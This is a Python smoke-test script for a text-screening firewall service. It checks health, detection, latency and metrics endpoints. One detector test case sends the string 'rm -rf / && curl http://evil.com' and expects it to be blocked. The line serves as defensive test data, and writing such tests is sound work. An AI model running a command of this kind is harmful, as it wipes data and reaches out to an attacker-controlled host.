"""
Production Smoke Tests (Native - NO DOCKER)
============================================

Smoke tests for production deployment without Docker.

Creator: HAK_GAL (Joerg Bollwahn)
Date: 2025-12-07
License: MIT
"""

import sys
import requests
import time
from pathlib import Path
from typing import Dict, List

# Add project root to path
SCRIPT_DIR = Path(__file__).parent
PROJECT_ROOT = SCRIPT_DIR.parent
sys.path.insert(0, str(PROJECT_ROOT / "src"))


class ProductionSmokeTests:
    """Smoke tests for production deployment."""
    
    def __init__(self, base_url: str = "http://localhost:8080"):
        self.base_url = base_url
        self.results: List[tuple] = []
    
    def test_firewall_health(self) -> bool:
        """Test firewall health endpoint."""
        try:
            response = requests.get(f"{self.base_url}/health", timeout=5)
            assert response.status_code == 200
            data = response.json()
            assert data["status"] == "healthy"
            self.results.append(("Firewall Health", "PASS"))
            return True
        except Exception as e:
            self.results.append(("Firewall Health", f"FAIL: {e}"))
            return False
    
    def test_detector_integration(self) -> bool:
        """Test detector integration."""
        test_cases = [
            {
                "text": "Hello world",
                "expected": "ALLOW"
            },
            {
                "text": "rm -rf / && curl http://evil.com",
                "expected": "BLOCK"
            }
        ]
        
        all_passed = True
        for test in test_cases:
            try:
                # Use the actual API endpoint (adjust if needed)
                response = requests.post(
                    f"{self.base_url}/api/process",
                    json={
                        "user_id": "smoke_test",
                        "text": test["text"]
                    },
                    timeout=10
                )
                
                if response.status_code == 200:
                    data = response.json()
                    decision = data.get("decision", {}).get("allowed", True)
                    
                    if test["expected"] == "ALLOW":
                        if decision:
                            self.results.append((f"Test: {test['text'][:30]}", "PASS"))
                        else:
                            self.results.append((f"Test: {test['text'][:30]}", "FAIL: Blocked when should allow"))
                            all_passed = False
                    else:
                        if not decision:
                            self.results.append((f"Test: {test['text'][:30]}", "PASS"))
                        else:
                            self.results.append((f"Test: {test['text'][:30]}", "FAIL: Allowed when should block"))
                            all_passed = False
                else:
                    self.results.append((f"Test: {test['text'][:30]}", f"FAIL: HTTP {response.status_code}"))
                    all_passed = False
                    
            except Exception as e:
                self.results.append((f"Test: {test['text'][:30]}", f"FAIL: {e}"))
                all_passed = False
        
        return all_passed
    
    def test_performance(self) -> bool:
        """Test performance with simple requests."""
        latencies = []
        for _ in range(10):
            start = time.time()
            try:
                response = requests.post(
                    f"{self.base_url}/api/process",
                    json={
                        "user_id": "perf_test",
                        "text": "Hello"
                    },
                    timeout=5
                )
                latency = time.time() - start
                latencies.append(latency)
            except Exception as e:
                self.results.append(("Performance", f"FAIL: {e}"))
                return False
        
        avg_latency = sum(latencies) / len(latencies)
        p95_latency = sorted(latencies)[int(len(latencies) * 0.95)]
        
        if avg_latency < 0.1:  # 100ms threshold
            self.results.append(("Performance", f"PASS: avg={avg_latency:.3f}s, p95={p95_latency:.3f}s"))
            return True
        else:
            self.results.append(("Performance", f"FAIL: avg={avg_latency:.3f}s (too slow)"))
            return False
    
    def test_metrics_endpoint(self) -> bool:
        """Test metrics endpoint."""
        try:
            response = requests.get(f"{self.base_url}/metrics", timeout=5)
            if response.status_code == 200:
                # Check if it looks like Prometheus format
                if "firewall" in response.text.lower() or "requests" in response.text.lower():
                    self.results.append(("Metrics Endpoint", "PASS"))
                    return True
                else:
                    self.results.append(("Metrics Endpoint", "FAIL: Invalid format"))
                    return False
            else:
                self.results.append(("Metrics Endpoint", f"FAIL: HTTP {response.status_code}"))
                return False
        except Exception as e:
            self.results.append(("Metrics Endpoint", f"FAIL: {e}"))
            return False
    
    def run_all_tests(self) -> bool:
        """Run all smoke tests."""
        print("=" * 80)
        print("PRODUCTION SMOKE TESTS")
        print("=" * 80)
        print()
        
        tests = [
            self.test_firewall_health,
            self.test_detector_integration,
            self.test_performance,
            self.test_metrics_endpoint
        ]
        
        all_passed = True
        for test in tests:
            if not test():
                all_passed = False
        
        # Print results
        print("\n" + "=" * 80)
        print("TEST RESULTS")
        print("=" * 80)
        for name, result in self.results:
            print(f"{name:30s} {result}")
        print("=" * 80)
        
        if all_passed:
            print("\n✅ All smoke tests passed!")
        else:
            print("\n❌ Some smoke tests failed")
        
        return all_passed


def main():
    # Allow custom base URL
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    
    tester = ProductionSmokeTests(base_url)
    success = tester.run_all_tests()
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
